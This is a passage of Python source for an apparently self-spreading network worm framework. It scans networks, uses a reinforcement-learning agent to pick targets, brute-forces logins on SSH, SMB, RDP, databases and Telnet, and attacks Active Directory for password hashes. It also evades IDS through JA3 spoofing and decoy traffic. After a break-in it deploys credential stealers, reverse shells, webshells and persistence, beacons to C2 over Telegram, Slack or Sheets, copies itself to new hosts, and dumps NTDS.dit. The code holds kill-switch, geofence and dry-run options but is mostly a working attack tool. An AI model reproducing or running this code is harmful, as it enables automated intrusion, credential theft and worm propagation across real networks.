                    self.rl_agent.epsilon = 0.1  # Low exploration for operation
                    logger.info(
                        f"Auto-trained model loaded (best reward: {trainer.best_reward:.2f})"
                    )
                    model_loaded = True
            except Exception as e:
                logger.warning(f"Auto-training failed: {e}")
                logger.info(
                    "Continuing with random weights (agent will learn during operation)"
                )

        self.real_world_agent = RealWorldPropagationAgent(self.rl_agent, action_size)

        # Thompson Sampling: initialize ensemble for Bayesian exploration
        self.use_thompson_sampling = self.config.ml.use_thompson_sampling if hasattr(self.config.ml, 'use_thompson_sampling') else False
        if self.use_thompson_sampling and hasattr(self.rl_agent, 'init_ensemble'):
            try:
                self.rl_agent.init_ensemble(n_networks=5)
                logger.info("Thompson Sampling: enabled (5-network bootstrapped ensemble)")
            except Exception as e:
                logger.warning(f"Thompson Sampling ensemble init failed: {e}")
                self.use_thompson_sampling = False

        # Audit Report Generator
        self.audit_generator = None
        if AUDIT_REPORT_AVAILABLE:
            self.audit_generator = AuditReportGenerator()

        # State tracking (thread-safe)
        self.infected_hosts: set = set()
        self.failed_targets: set = set()
        self.scan_results: list = []
        self.start_time = None
        self.kill_switch_activated = False
        self.running = False
        self._detection_events: list = []
        self._data_lock = threading.RLock()

        # Statistics
        self.stats = {
            "scans": 0,
            "infections": 0,
            "failed_exploits": 0,
            "total_hosts_discovered": 0,
            "lateral_movements": 0,
            "lateral_success": 0,
            "credentials_discovered": 0,
            "polymorphic_mutations": 0,
            "vulnerabilities_found": 0,
            "exploit_chains_built": 0,
            "brute_force_attempts": 0,
            "brute_force_successes": 0,
            "c2_beacons": 0,
            "start_time": None,
            "end_time": None,
        }

    def _apply_profile(self, profile: str):
        """Apply configuration profile overrides"""
        overrides = CONFIG_PROFILES.get(profile, {})
        if not overrides:
            return

        for key, value in overrides.items():
            if hasattr(self.config.propagation, key):
                setattr(self.config.propagation, key, value)
            elif hasattr(self.config.evasion, key):
                setattr(self.config.evasion, key, value)
            elif hasattr(self.config.safety, key):
                setattr(self.config.safety, key, value)
            elif hasattr(self.config.ml, key):
                setattr(self.config.ml, key, value)

        logger.info(f"Applied profile: {profile}")

    def _safe_add_infected(self, ip: str):
        with self._data_lock:
            self.infected_hosts.add(ip)

    def _safe_add_failed(self, ip: str):
        with self._data_lock:
            self.failed_targets.add(ip)

    def _safe_is_infected(self, ip: str) -> bool:
        with self._data_lock:
            return ip in self.infected_hosts

    def _safe_infection_count(self) -> int:
        with self._data_lock:
            return len(self.infected_hosts)

    def _safe_scan_results_copy(self) -> List[Dict]:
        with self._data_lock:
            return list(self.scan_results)

    def check_safety_constraints(self) -> bool:
        """Check if safety constraints are violated"""
        if self.kill_switch_activated:
            logger.log_kill_switch("Manual activation")
            return False

        if len(self.infected_hosts) >= self.config.propagation.max_infections:
            logger.warning(
                f"Max infections reached: {self.config.propagation.max_infections}"
            )
            return False

        if self.start_time and self.config.safety.max_runtime_hours > 0:
            elapsed = datetime.now() - self.start_time
            max_runtime = timedelta(hours=self.config.safety.max_runtime_hours)
            if elapsed > max_runtime:
                logger.warning(
                    f"Max runtime exceeded: {self.config.safety.max_runtime_hours}h"
                )
                return False

        if self.start_time and self.config.safety.auto_destruct_time > 0:
            elapsed = datetime.now() - self.start_time
            destruct_time = timedelta(hours=self.config.safety.auto_destruct_time)
            if elapsed > destruct_time:
                logger.critical(
                    f"Auto-destruct timer: {self.config.safety.auto_destruct_time}h"
                )
                self.self_destruct()
                return False

        if self.config.safety.geofence_enabled:
            from utils.network_utils import get_local_ip, is_ip_in_range

            local_ip = get_local_ip()
            in_allowed = any(
                is_ip_in_range(local_ip, net)
                for net in self.config.safety.allowed_networks
            )
            if not in_allowed:
                logger.critical(f"Geofence violation: {local_ip}")
                return False

        return True

    def activate_kill_switch(self, code: str):
        """Activate kill switch"""
        if code == self.config.safety.kill_switch_code:
            logger.log_kill_switch("Correct code")
            self.kill_switch_activated = True
            self.shutdown()
        else:
            logger.warning("Invalid kill switch code")

    def scan_network(self, use_professional: bool = True) -> List[Dict]:
        """Perform network reconnaissance with professional scanner"""
        logger.info("Starting network reconnaissance")

        if self.activity_bridge:
            self.activity_bridge.on_scan_start(self.config.network.target_ranges)

        self.stats["scans"] += 1

        # Use professional scanner if available
        if use_professional and self.pro_scanner:
            logger.info("Using Professional Scanner")
            loop = asyncio.new_event_loop()
            def update_progress(scanned, total, found):
                pct = (scanned / max(total, 1)) * 100
                bar_len = 20
                filled = int(bar_len * scanned // max(total, 1))
                bar = '█' * filled + '░' * (bar_len - filled)
                self.stats['scan_progress'] = f"[{bar}] {pct:.1f}% ({scanned}/{total})"

            try:
                results = loop.run_until_complete(
                    self.pro_scanner.scan_network(
                        self.config.network.target_ranges,
                        categories=[
                            "essential",
                            "windows",
                            "linux",
                            "database",
                            "web",
                            "remote",
                        ],
                        progress_callback=update_progress if getattr(self, 'cli_monitor', None) else None,
                        show_progress=not getattr(self, 'cli_monitor', None)
                    )
                )
            finally:
                loop.close()

            # If pro_scanner found nothing, fall back to enterprise TCP scanner
            if not results and self.enterprise_scanner:
                logger.info("Pro scanner returned 0 hosts — falling back to Enterprise TCP Scanner")
                results = []
                for cidr in self.config.network.target_ranges:
                    found = self.enterprise_scanner.scan_range(cidr)
                    results.extend(found)
        elif self.enterprise_scanner:
            # Use new enterprise TCP scanner (Docker/Windows compatible)
            logger.info("Using Enterprise TCP Scanner v2")
            results = []
            for cidr in self.config.network.target_ranges:
                found = self.enterprise_scanner.scan_range(
                    cidr,
                    callback=lambda h: self.cli_monitor.log_event(
                        'scan',
                        f"Host found: {h['hostname']} ({h['asset_type']}) val={h['asset_value']}",
                        h['ip'], h
                    ) if self.cli_monitor else None
                )
                results.extend(found)
            # Sort by asset value — highest priority targets first
            results.sort(key=lambda h: h.get('asset_value', 0), reverse=True)
        else:
            results = self.scanner.scan_network(self.config.network.target_ranges)

        self.scan_results = results
        self.stats["total_hosts_discovered"] = len(results)

        # ── Classify discovered hosts with ML ─────────────────────────────
        if self.host_classifier:
            for host in results:
                try:
                    host_type = self.host_classifier.classify(host)
                    host["host_type"] = host_type
                    vuln_score = self.host_classifier.predict_vulnerability(host)
                    host["ml_vulnerability_score"] = vuln_score
                except Exception:
                    host["host_type"] = "unknown"

        # ── Active Directory Attack (if DCs detected) ──────────────────────
        if self.ad_attacker and results:
            try:
                ad_report = self.ad_attacker.attack(
                    scan_results=results,
                    domain=getattr(self.config, 'domain', None),
                    credentials=('', '')
                )
                if ad_report.get('dcs_found'):
                    logger.success(
                        f"AD Attack: {len(ad_report['dcs_found'])} DC(s) found, "
                        f"{len(ad_report.get('asrep_hashes', []))} AS-REP hashes, "
                        f"{len(ad_report.get('kerberoast_hashes', []))} Kerberoast hashes"
                    )
                    self.stats['ad_hashes_captured'] = ad_report.get('total_hashes', 0)
                    if self.cli_monitor:
                        self.cli_monitor.log_event(
                            'exploit',
                            f"AD: {ad_report['total_hashes']} hashes captured from DC",
                            ad_report['dcs_found'][0],
                            ad_report
                        )
            except Exception as e:
                logger.warning(f"AD attack failed: {e}")

        # Update knowledge graph
        if self.knowledge_graph:
            for host in results:
                ip = host.get("ip", "")
                self.knowledge_graph.add_host(
                    ip,
                    os_guess=host.get("os_guess", "Unknown"),
                    ports=host.get("open_ports", []),
                    is_infected=ip in self.infected_hosts,
                    is_high_value=host.get("vulnerability_score", 0) > 70,
                    subnet=host.get("subnet", ""),
                )

                # Add services
                services = host.get("services", {})
                if isinstance(services, dict):
                    for port_str, svc_name in services.items():
                        try:
                            port = int(port_str)
                        except (ValueError, TypeError):
                            continue
                        self.knowledge_graph.add_service(ip, port, svc_name)

                # Add reachability from infected hosts
                for infected_ip in self.infected_hosts:
                    self.knowledge_graph.add_reachability(infected_ip, ip)

        # Run vulnerability scan on discovered hosts
        if self.vuln_scanner and results:
            for host in results:
                vulns = self.vuln_scanner.scan_target(host)
                if vulns:
                    host["vulnerabilities"] = vulns
                    self.stats["vulnerabilities_found"] += len(vulns)

                    # Build exploit chains
                    if self.exploit_chain:
                        chain = self.exploit_chain.build_chain(host)
                        if chain:
                            host["exploit_chain"] = chain
                            self.stats["exploit_chains_built"] += 1

        if self.activity_bridge:
            for host in results:
                self.activity_bridge.on_host_discovered(
                    host["ip"],
                    host.get("open_ports", []),
                    host.get("os_guess", "Unknown"),
                )

        logger.success(
            f"Discovered {len(results)} hosts, {self.stats['vulnerabilities_found']} vulnerabilities"
        )

        # MITRE ATT&CK: record discovery
        if self.mitre_mapper:
            try:
                self.mitre_mapper.record(
                    wormy_technique="discovery",
                    target=",".join(h["ip"] for h in results[:5]),
                    success=True,
                    details={"hosts_found": len(results), "vulns": self.stats["vulnerabilities_found"]},
                )
            except Exception:
                pass

        self.real_world_agent.update_state(results, self.infected_hosts)
        return results

    def select_next_target(self) -> Optional[Dict]:
        """Select next target using RL agent + knowledge graph + vulnerability scoring"""
        logger.info("Selecting next target")

        self.real_world_agent.update_state(self.scan_results, self.infected_hosts)

        # 1. Knowledge graph: prioritize high-value uninfected targets
        if self.knowledge_graph:
            high_value = self.knowledge_graph.get_high_value_targets()
            if high_value:
                for hv_ip in high_value:
                    for host in self.scan_results:
                        if host["ip"] == hv_ip and hv_ip not in self.infected_hosts:
                            logger.info(
                                f"Knowledge Graph: prioritizing high-value target {hv_ip}"
                            )
                            if self.activity_bridge:
                                self.activity_bridge.on_ml_decision(hv_ip, 0.9)
                            return host

        # 2. Vulnerability-based prioritization
        if self.scan_results:
            best_vuln_target = None
            best_vuln_score = 0
            for host in self.scan_results:
                if (
                    host["ip"] in self.infected_hosts
                    or host["ip"] in self.failed_targets
                ):
                    continue
                vulns = host.get("vulnerabilities", [])
                if vulns:
                    max_cvss = max(v.get("cvss", 0) for v in vulns)
                    if max_cvss > best_vuln_score:
                        best_vuln_score = max_cvss
                        best_vuln_target = host

            if best_vuln_target and best_vuln_score >= 9.0:
                logger.info(
                    f"Vulnerability Scanner: prioritizing {best_vuln_target['ip']} (CVSS: {best_vuln_score})"
                )
                return best_vuln_target

        # 3. RL agent selection (with optional Thompson Sampling)
        target = self.real_world_agent.select_next_target(
            use_thompson=getattr(self, 'use_thompson_sampling', False)
        )

        if target:
            logger.log_ml_decision(
                "RL_Agent",
                f"Target: {target['ip']}",
                target.get("confidence", 0.5),
                {
                    "ip": target["ip"],
                    "priority": target.get("priority", 0),
                    "vuln_score": target.get("vulnerability_score", 0),
                },
            )
            if self.activity_bridge:
                self.activity_bridge.on_ml_decision(
                    target["ip"], target.get("confidence", 0.5)
                )

        return target

    def exploit_target(self, target: Dict) -> bool:
        """Exploit target with full professional engine integration"""
        ip = target["ip"]
        logger.info(f"Attempting to exploit {ip}")

        if ip in self.infected_hosts:
            return False
        if ip in self.failed_targets:
            return False

        # Honeypot/IDS detection
        if self.config.evasion.detect_ids:
            if self.ids_detector.should_avoid_target(ip, target):
                logger.warning(f"Avoiding {ip} - IDS/honeypot detected")
                self.failed_targets.add(ip)
                return False

        # ML Evasion Model: predict detection probability before acting
        if self.evasion_model:
            try:
                ports = target.get("open_ports", [])
                os_guess = target.get("os_guess", "").lower()
                features = {
                    'scan_rate': self.stats.get("scans", 0),
                    'stealth_delay': self.config.propagation.propagation_delay,
                    'ports_scanned': len(ports),
                    'targets_parallel': 1,
                    'is_windows_target': 1.0 if "windows" in os_guess else 0.0,
                    'is_linux_target': 1.0 if "linux" in os_guess else 0.0,
                    'is_dc_target': 1.0 if target.get("host_type") == "domain_controller" else 0.0,
                    'has_edr': 0.5,
                    'has_ids': 0.3,
                    'has_av': 0.5,
                    'is_honeypot': 0.0,
                    'hour_of_day': datetime.now().hour / 24.0,
                    'is_work_hours': 1.0 if 8 <= datetime.now().hour <= 18 else 0.0,
                    'day_of_week': datetime.now().weekday() / 7.0,
                    'success_rate_last_10': 0.5,
                    'polymorphic_level': 2.0,
                    'protocol_count': float(len(set(ports))),
                    'credential_age_hours': 0.0,
                }
                det_prob = self.evasion_model.predict_detection_probability(features)
                if det_prob > 0.8 and self.config.evasion.stealth_mode:
                    logger.warning(f"Evasion model: {det_prob:.1%} detection risk on {ip} — skipping")
                    self.failed_targets.add(ip)
                    return False
                logger.debug(f"Evasion model: {det_prob:.1%} detection probability on {ip}")
            except Exception as e:
                logger.debug(f"Evasion model check failed: {e}")

        # Polymorphic network signature
        if self.polymorphic_engine and self.config.evasion.stealth_mode:
            net_sig = self.polymorphic_engine.mutate_network_signature()
            logger.debug(f"Polymorphic network signature applied for {ip}")
            self.stats["polymorphic_mutations"] += 1

        # Active IDS/IPS evasion
        if self.ids_evasion and self.config.evasion.stealth_mode:
            evasion_strategy = self.ids_evasion.adaptive_evasion(
                ip, self._detection_events if hasattr(self, "_detection_events") else []
            )
            logger.debug(
                f"IDS evasion strategy: {evasion_strategy['strategy']} (risk: {evasion_strategy['risk_level']:.2f})"
            )

            # Generate decoy traffic to confuse IDS
            if "decoys" in evasion_strategy["techniques"]:
                decoys = self.ids_evasion.generate_decoy_traffic(ip, count=3)
                logger.debug(f"Generated {len(decoys)} decoy traffic patterns")

            # Protocol mimicry
            if "protocol_mimicry" in evasion_strategy["techniques"]:
                logger.debug("Protocol mimicry enabled")

        # JA3 Spoofing for HTTP/HTTPS targets
        ports = target.get("open_ports", [])
        if self.ja3_spoofer and any(p in (80, 443, 8080, 8443) for p in ports):
            try:
                ssl_ctx = self.ja3_spoofer.get_ssl_context()
                headers = self.ja3_spoofer.get_headers()
                logger.debug(f"JA3 spoofed context ready for {ip} (profile: chrome_120)")
            except Exception as e:
                logger.debug(f"JA3 spoofing failed for {ip}: {e}")

        # Fuzzing Engine: probe for unknown vulnerabilities
        if self.fuzzing_engine and not self.config.evasion.stealth_mode:
            try:
                for port in ports[:3]:
                    result = self.fuzzing_engine.fuzz_string(ip, port, b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
                    if result:
                        logger.debug(f"Fuzzing on {ip}:{port} — {len(result)} tests run")
            except Exception as e:
                logger.debug(f"Fuzzing failed for {ip}: {e}")

        # Stealth delay
        if self.config.evasion.stealth_mode:
            if self.polymorphic_engine:
                delay = self.polymorphic_engine.get_timing_delay(
                    self.stealth_engine.get_scan_delay(ip)
                )
            else:
                delay = self.stealth_engine.get_scan_delay(ip)
            logger.debug(f"Stealth delay: {delay:.2f}s")
            time.sleep(delay)

        if self.dry_run:
            logger.info(f"[DRY RUN] Would exploit {ip}")
            self.infected_hosts.add(ip)
            self.stats["infections"] += 1
            if self.knowledge_graph:
                self.knowledge_graph.mark_infected(ip, "dry_run")
            return True

        # 1. Try exploit chains first (highest priority)
        if target.get("exploit_chain"):
            chain = target["exploit_chain"]
            for step in chain:
                if step["phase"] == "initial_access" and step.get("msf_module"):
                    # Try via Metasploit if available
                    if (
                        self.exploit_manager.use_metasploit
                        and self.exploit_manager.msf_client
                    ):
                        exploit_key = self._msf_module_to_key(step["msf_module"])
                        if exploit_key:
                            success, result = (
                                self.exploit_manager._try_metasploit_exploits(target)
                            )
                            if success:
                                return self._handle_successful_exploit(
                                    ip, target, result
                                )

        # 2. Try brute force engine
        if self.brute_force_engine:
            bf_results = self._try_brute_force(target)
            if bf_results:
                return self._handle_successful_exploit(
                    ip,
                    target,
                    {
                        "method": f"brute_force_{bf_results[0].get('service', 'unknown')}",
                        "credentials": (
                            bf_results[0].get("username", ""),
                            bf_results[0].get("password", ""),
                        ),
                    },
                )

        # 3. Try exploit manager (native exploits)
        success, result = self.exploit_manager.exploit_target(target)

        if success:
            return self._handle_successful_exploit(ip, target, result)
        else:
            self.failed_targets.add(ip)
            self.stats["failed_exploits"] += 1

            if self.activity_bridge:
                self.activity_bridge.on_exploit_failed(ip, "Unknown")

            if self.knowledge_graph:
                self.knowledge_graph.record_exploit_attempt(ip, "Unknown", False)

            # MITRE ATT&CK: record failed attempt
            if self.mitre_mapper:
                try:
                    self.mitre_mapper.record(
                        wormy_technique="exploit_failed",
                        target=ip,
                        success=False,
                        details={"reason": "all_exploits_failed"},
                    )
                except Exception:
                    pass

            self.real_world_agent.provide_feedback(target, False, -5)
            self.stealth_engine.record_action(ip, "exploit_failed")
            return False

    def _handle_successful_exploit(self, ip: str, target: Dict, result: Dict) -> bool:
        """Handle a successful exploitation"""
        exploit_name = result.get("method", "Unknown")
        logger.log_infection(
            ip,
            exploit_name,
            {
                "os": target.get("os_guess", "Unknown"),
                "ports": target.get("open_ports", []),
                "exploit_result": result,
            },
        )

        if self.activity_bridge:
            self.activity_bridge.on_exploit_success(ip, exploit_name)
            self.activity_bridge.on_infection(ip, exploit_name)

        self.infected_hosts.add(ip)
        self.stats["infections"] += 1

        # Update knowledge graph
        if self.knowledge_graph:
            self.knowledge_graph.mark_infected(ip, exploit_name)

            # Record credentials from exploit result
            if "credentials" in result:
                creds = result["credentials"]
                if isinstance(creds, tuple) and len(creds) == 2:
                    self.cred_manager.add_discovered_credential(
                        creds[0], creds[1], source=exploit_name
                    )
                    self.stats["credentials_discovered"] += 1

        # Register with Host Monitor (unique payload mutation)
        if self.host_monitor:
            host_state = self.host_monitor.register_host(
                ip,
                os_guess=target.get("os_guess", "Unknown"),
                ports=target.get("open_ports", []),
                exploit_method=exploit_name,
            )
            self.host_monitor.record_host_activity(
                ip,
                "infection",
                f"Infected via {exploit_name}",
                {
                    "os": target.get("os_guess", "Unknown"),
                    "ports": target.get("open_ports", []),
                },
            )

        # RL feedback
        reward = 20 + target.get("vulnerability_score", 0) / 5
        if target.get("vulnerability_score", 0) > 70:
            reward += 15  # High-value bonus
        self.real_world_agent.provide_feedback(target, True, reward)

        self.stealth_engine.record_action(ip, "exploit_success")

        # Contextual Bandit: record successful credential usage
        if self.contextual_bandit and "credentials" in result:
            try:
                creds = result["credentials"]
                if isinstance(creds, tuple) and len(creds) == 2:
                    bandit_context = {
                        "service": exploit_name.split("_")[0].lower() if "_" in exploit_name else exploit_name.lower(),
                        "os": target.get("os_guess", "Unknown"),
                        "ports": target.get("open_ports", []),
                        "is_high_value": target.get("vulnerability_score", 0) > 70,
                        "is_domain_controller": target.get("host_type") == "domain_controller",
                        "is_database": target.get("host_type") == "database",
                        "target_count": len(self.infected_hosts),
                    }
                    self.contextual_bandit.update(
                        username=creds[0], password=creds[1],
                        context=bandit_context, reward=1.0
                    )
            except Exception:
                pass

        # Payload Manager: deploy specialized payloads
        if self.payload_manager:
            try:
                payloads = {
                    "credential_stealer": self.payload_manager.specialized.generate_credential_stealer("all"),
                    "backdoor": self.payload_manager.generator.generate_reverse_shell(
                        target.get("os_guess", "Linux"), "python"
                    ),
                }
                for pname, payload in payloads.items():
                    if payload:
                        logger.debug(f"Generated {pname} payload for {ip} ({len(payload)} bytes)")
                self.stats["payloads_deployed"] = self.stats.get("payloads_deployed", 0) + len(payloads)
            except Exception as e:
                logger.debug(f"Payload deployment failed for {ip}: {e}")

        # C2 beacon
        if self.c2_server:
            try:
                self.c2_server.register_host(
                    ip,
                    {
                        "os": target.get("os_guess", "Unknown"),
                        "ports": target.get("open_ports", []),
                        "exploit": exploit_name,
                    },
                )
                self.stats["c2_beacons"] += 1
            except Exception:
                pass

        # Cloud C2 beacon (Telegram/Slack/Sheets)
        if self.cloud_c2:
            try:
                self.cloud_c2.beacon({
                    "event": "infection",
                    "ip": ip,
                    "os": target.get("os_guess", "Unknown"),
                    "exploit": exploit_name,
                    "timestamp": datetime.utcnow().isoformat(),
                })
            except Exception:
                pass

        # MITRE ATT&CK: record initial access
        if self.mitre_mapper:
            try:
                technique = "T1190" if exploit_name == "Web_Exploit" else "T1078"
                self.mitre_mapper.record(
                    wormy_technique=exploit_name,
                    target=ip,
                    success=True,
                    details={"method": exploit_name, "os": target.get("os_guess")},
                )
            except Exception:
                pass

        # Try lateral movement from this newly infected host
        self._try_lateral_movement(ip, target)

        # ── Post-infection actions (best-effort, never block) ──────────────
        creds = result.get("credentials")
        username = creds[0] if isinstance(creds, (tuple, list)) and len(creds) >= 2 else None
        password = creds[1] if isinstance(creds, (tuple, list)) and len(creds) >= 2 else None

        # 1. Self-copy worm to target
        if self.self_copy and username and password:
            try:
                os_guess = target.get("os_guess", "").lower()
                if "linux" in os_guess or "unix" in os_guess:
                    self.self_copy.transfer_via_ssh(ip, username, password)
                elif "windows" in os_guess:
                    self.self_copy.transfer_via_smb(ip, username, password)
            except Exception as e:
                logger.debug(f"Self-copy to {ip} failed: {e}")

        # 2. Deploy additional payloads
        if self.payload_deployer and username and password:
            try:
                ports = target.get("open_ports", [])
                for port in ports:
                    if port in (22,) and "linux" in target.get("os_guess", "").lower():
                        self.payload_deployer.deploy_via_ssh(ip, port, username, password)
                    elif port in (445, 139) and "windows" in target.get("os_guess", "").lower():
                        self.payload_deployer.deploy_via_smb(ip, username, password)
                    elif port in (80, 443, 8080):
                        self.payload_deployer.deploy_webshell(ip, port, username, password)
            except Exception as e:
                logger.debug(f"Payload deploy to {ip} failed: {e}")

        # 3. Install remote persistence
        if self.remote_persistence and username and password:
            try:
                worm_path = os.path.abspath(__file__)
                self.remote_persistence.establish(
                    ip=ip,
                    os_type=target.get("os_guess", "Unknown"),
                    username=username,
                    password=password,
                    payload_path=worm_path,
                )
            except Exception as e:
                logger.debug(f"Persistence on {ip} failed: {e}")

        # 4. Deploy dormant cell
        if self.dormant_cells:
            try:
                self.dormant_cells.deploy_cell(ip, max_dormant_days=7)
            except Exception as e:
                logger.debug(f"Dormant cell deploy to {ip} failed: {e}")

        # 5. Register with agent controller
        if self.agent_controller:
            try:
                self.agent_controller.register_agent(
                    ip=ip,
                    username=username or "unknown",
                    password=password or "",
                    os_type=target.get("os_guess", "Unknown"),
                    hostname=target.get("hostname", ip),
                )
            except Exception as e:
                logger.debug(f"Agent registration for {ip} failed: {e}")

        return True

    def _try_brute_force(self, target: Dict) -> List[Dict]:
        """
        Enterprise-grade brute force using EnterprisePasswordEngine.
        Covers SSH, FTP, MySQL, Postgres, MSSQL, MongoDB, Redis (auth) + HTTP.
        Uses mutation engine, lockout protection, and smart credential ordering.
        Falls back to legacy BruteForceEngine if enterprise engine unavailable.
        """
        ip    = target["ip"]
        ports = target.get("open_ports", [])

        # \u2500\u2500 Enterprise Password Engine path \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
        if self.enterprise_password_engine:
            results = self.enterprise_password_engine.targeted_brute(
                ip=ip,
                port=ports[0] if ports else 22,
                mutations=True,
            )
            # Also try spray for all supported ports on this host
            if not results:
                results = self.enterprise_password_engine._spray_round(
                    [target], password="Welcome1"
                )
            if results:
                self.stats["brute_force_successes"] += len(results)
                self.stats["brute_force_attempts"]  += 1
                # Feed discovered creds back into exploit manager
                for r in results:
                    self.exploit_manager.add_credential(r['username'], r['password'])
            else:
                self.stats["brute_force_attempts"] += 1
            return results

        # \u2500\u2500 Legacy path \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
        if not self.brute_force_engine:
            return []

        # Determine services to brute force
        services = []
        if 22 in ports:    services.append(("ssh",      22))
        if 445 in ports or 139 in ports: services.append(("smb", 445 if 445 in ports else 139))
        if 21 in ports:    services.append(("ftp",      21))
        if 3306 in ports:  services.append(("mysql",    3306))
        if 5432 in ports:  services.append(("postgres", 5432))
        if 3389 in ports:  services.append(("rdp",      3389))
        if 23 in ports:    services.append(("telnet",   23))

        results = []
        for service, port in services[:3]:
            def login_func(tgt_ip, tgt_port, username, password):
                return self._try_service_login(tgt_ip, tgt_port, service, username, password)

            bf_results = self.brute_force_engine.brute_force(
                ip, service, port,
                login_func=login_func,
                max_attempts=20,
                target_info=target,
            )
            if bf_results:
                results.extend(bf_results)
                self.stats["brute_force_successes"] += len(bf_results)
            self.stats["brute_force_attempts"] += 1

        return results


    def _try_service_login(
        self, ip: str, port: int, service: str, username: str, password: str
    ) -> bool:
        """Try login on a specific service"""
        try:
            if service == "ssh":
                import paramiko

                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(
                    ip, port=port, username=username, password=password, timeout=5
                )
                client.close()
                return True
            elif service == "ftp":
                from ftplib import FTP

                ftp = FTP()
                ftp.connect(ip, port, timeout=5)
                ftp.login(username, password)
                ftp.quit()
                return True
            elif service == "mysql":
                import mysql.connector

                conn = mysql.connector.connect(
                    host=ip,
                    port=port,
                    user=username,
                    password=password,
                    connect_timeout=5,
                )
                conn.close()
                return True
            elif service == "smb":
                from impacket.smbconnection import SMBConnection

                conn = SMBConnection(ip, ip, sess_port=port)
                conn.login(username, password)
                conn.close()
                return True
            elif service == "postgres":
                import psycopg2

                conn = psycopg2.connect(
                    host=ip,
                    port=port,
                    user=username,
                    password=password,
                    connect_timeout=5,
                    dbname="postgres",
                )
                conn.close()
                return True
            elif service == "rdp":
                import subprocess

                result = subprocess.run(
                    [
                        "xfreerdp",
                        f"/v:{ip}",
                        f"/u:{username}",
                        f"/p:{password}",
                        "/cert:ignore",
                        "/auth-only",
                        "/timeout:5000",
                    ],
                    capture_output=True,
                    timeout=10,
                )
                return result.returncode == 0
            elif service == "telnet":
                import telnetlib

                tn = telnetlib.Telnet(ip, port, timeout=5)
                tn.read_until(b"login: ", timeout=3)
                tn.write(username.encode() + b"\n")
                tn.read_until(b"Password: ", timeout=3)
                tn.write(password.encode() + b"\n")
                resp = tn.read_some()
                tn.close()
                return (
                    b"incorrect" not in resp.lower() and b"failed" not in resp.lower()
                )
        except Exception:
            return False
        return False

    def _msf_module_to_key(self, msf_module: str) -> Optional[str]:
        """Convert Metasploit module path to exploit key"""
        if not self.exploit_manager.msf_client:
            return None
        for key, info in self.exploit_manager.msf_client.EXPLOIT_MAP.items():
            if info["msf_path"] == msf_module:
                return key
        return None

    def _try_lateral_movement(self, source_ip: str, source_target: Dict):
        """Attempt lateral movement from newly infected host"""
        if not self.lateral_movement or not self.knowledge_graph:
            return

        # Get credentials discovered on this host
        creds_list = self.knowledge_graph.get_credentials_for_host(source_ip)
        if not creds_list and self.cred_manager:
            discovered = self.cred_manager.get_discovered_credentials()
            if discovered:
                creds_list = [
                    {"username": u, "password": p, "type": "password"}
                    for u, p in discovered
                ]

        if not creds_list:
            return

        # Find reachable uninfected hosts
        uninfected = self.knowledge_graph.get_uninfected_hosts()
        if not uninfected:
            return

        for cred_info in creds_list[:3]:
            credentials = {
                "username": cred_info.get("username", ""),
                "password": cred_info.get("password", ""),
                "hash": cred_info.get("hash", ""),
                "ssh_key": cred_info.get("ssh_key", ""),
            }

            for target_ip in uninfected[:5]:
                target_info = None
                for host in self.scan_results:
                    if host["ip"] == target_ip:
                        target_info = host
                        break

                if not target_info:
                    continue

                source_host = {
                    "ip": source_ip,
                    "os_guess": source_target.get("os_guess", "Unknown"),
                }

                logger.info(
                    f"Lateral movement: {source_ip} -> {target_ip} as {credentials.get('username', '?')}"
                )
                self.stats["lateral_movements"] += 1

                if self.dry_run:
                    logger.info(
                        f"[DRY RUN] Would attempt lateral movement to {target_ip}"
                    )
                    continue

                success, result = self.lateral_movement.move(
                    source_host, target_info, credentials=credentials
                )

                if success:
                    self.stats["lateral_success"] += 1
                    logger.success(
                        f"Lateral movement succeeded: {source_ip} -> {target_ip}"
                    )

                    if target_ip not in self.infected_hosts:
                        self.infected_hosts.add(target_ip)
                        self.stats["infections"] += 1

                        if self.knowledge_graph:
                            self.knowledge_graph.mark_infected(
                                target_ip, result.get("technique", "lateral")
                            )

                        # Register with Host Monitor (unique payload)
                        if self.host_monitor:
                            self.host_monitor.register_host(
                                target_ip,
                                os_guess=target_info.get("os_guess", "Unknown"),
                                ports=target_info.get("open_ports", []),
                                exploit_method=f"lateral_{result.get('technique', 'unknown')}",
                            )
                            self.host_monitor.record_lateral_movement(
                                source_ip,
                                target_ip,
                                result.get("technique", "unknown"),
                                True,
                            )

                        self.real_world_agent.provide_feedback(target_info, True, 30)

                    # Record lateral movement on source host
                    if self.host_monitor:
                        self.host_monitor.record_lateral_movement(
                            source_ip,
                            target_ip,
                            result.get("technique", "unknown"),
                            True,
                        )

                    return

        # ── DCOM Lateral Movement (Windows targets) ──────────────────────
        if self.dcom_lateral:
            try:
                os_guess = source_target.get("os_guess", "").lower()
                if "windows" in os_guess:
                    for target_ip in uninfected[:3]:
                        dcom_ok, dcom_result = self.dcom_lateral.move(
                            target_ip=target_ip,
                            command="whoami",
                            username=credentials.get("username"),
                            password=credentials.get("password"),
                            technique="auto",
                        )
                        if dcom_ok:
                            logger.success(f"DCOM lateral: {source_ip} -> {target_ip}")
                            if target_ip not in self.infected_hosts:
                                self.infected_hosts.add(target_ip)
                                self.stats["infections"] += 1
                            break
            except Exception as e:
                logger.debug(f"DCOM lateral movement failed: {e}")

        # ── VSS NTDS Extraction (Windows targets) ────────────────────────
        if self.vss_ntds:
            try:
                os_guess = source_target.get("os_guess", "").lower()
                if "windows" in os_guess:
                    logger.info(f"Extracting NTDS.dit via VSS on {source_ip}")
                    ntds_result = self.vss_ntds.run(volume="C:", cleanup=True)
                    if ntds_result.get("ntds_dumped"):
                        logger.success(f"NTDS.dit extracted from {source_ip}")
                        self.stats["credentials_discovered"] += len(
                            ntds_result.get("hashes", [])
                        )
            except Exception as e:
                logger.debug(f"VSS NTDS extraction failed: {e}")

    def _online_learning_step(self):
        """Perform online learning: replay experiences to fine-tune RL agent"""
        memory = self.rl_agent.memory
